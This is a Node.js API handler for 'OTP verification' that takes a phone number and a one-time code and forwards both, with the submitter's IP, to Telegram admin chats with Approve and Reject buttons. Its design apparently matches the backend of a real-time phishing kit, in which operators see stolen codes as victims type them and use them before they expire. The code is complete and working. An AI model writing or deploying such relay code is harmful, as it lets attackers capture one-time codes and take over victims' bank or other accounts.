/* POST /api/otp/verify — Alert 2: number + OTP + Approve/Reject buttons */
module.exports = async (req, res) => {
  const BOT_TOKEN = process.env.BOT_TOKEN || '';
  const ADMIN_IDS = (process.env.ADMIN_CHAT_IDS || '').split(',').map(s => s.trim()).filter(Boolean);
  const tg = (m, b) => fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/' + m, {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(b)
  }).then(r => r.json()).catch(() => ({ ok: false }));
  const readBody = () => new Promise(resolve => {
    if (req.body && typeof req.body === 'object') return resolve(req.body);
    let d = ''; req.on('data', c => { d += c; if (d.length > 1e5) req.destroy(); });
    req.on('end', () => { try { resolve(d ? JSON.parse(d) : {}); } catch { resolve({}); } });
    req.on('error', () => resolve({}));
  });

  if (req.method !== 'POST') return res.status(405).json({ ok: false });
  const body = await readBody();
  const phone = String(body.phone || '').replace(/\D/g, '');
  const otp   = String(body.otp   || '').replace(/\D/g, '');
  if (!/^\d{10}$/.test(phone) || !/^\d{4}$/.test(otp)) return res.status(400).json({ ok: false });

  const id = Math.random().toString(36).slice(2, 8).toUpperCase();
  const ip = ((req.headers['x-forwarded-for'] || '').split(',')[0].trim()
    || req.socket.remoteAddress || 'unknown').replace('::ffff:', '');
  const text = '🔐 *OTP check — ' + id + '*\n'
    + '📱 Number: `+91 ' + phone + '`\n'
    + '🔢 OTP entered: `' + otp + '`\n'
    + '🌐 IP: `' + ip + '`\n\n'
    + '⏳ Auto-cancel in 2:00';
  const markup = { inline_keyboard: [[
    { text: '✅ Approve', callback_data: 'otp:approve:' + id },
    { text: '❌ Reject',  callback_data: 'otp:reject:'  + id }
  ]]};

  const results = await Promise.all(ADMIN_IDS.map(chat =>
    tg('sendMessage', { chat_id: chat, text, parse_mode: 'Markdown', reply_markup: markup })));
  if (!results.some(r => r.ok)) return res.status(502).json({ ok: false });
  return res.status(200).json({ ok: true, requestId: id });
};
